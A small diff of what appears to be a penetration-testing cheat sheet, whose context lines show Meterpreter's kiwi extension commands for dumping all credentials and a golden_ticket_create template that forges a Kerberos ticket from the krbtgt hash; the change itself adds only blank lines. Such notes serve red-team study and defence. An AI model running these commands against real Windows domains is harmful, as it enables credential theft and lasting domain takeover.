@@ -16,3 +16,5 @@ load kiwi
 creds_all
 golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
 ```
+
+
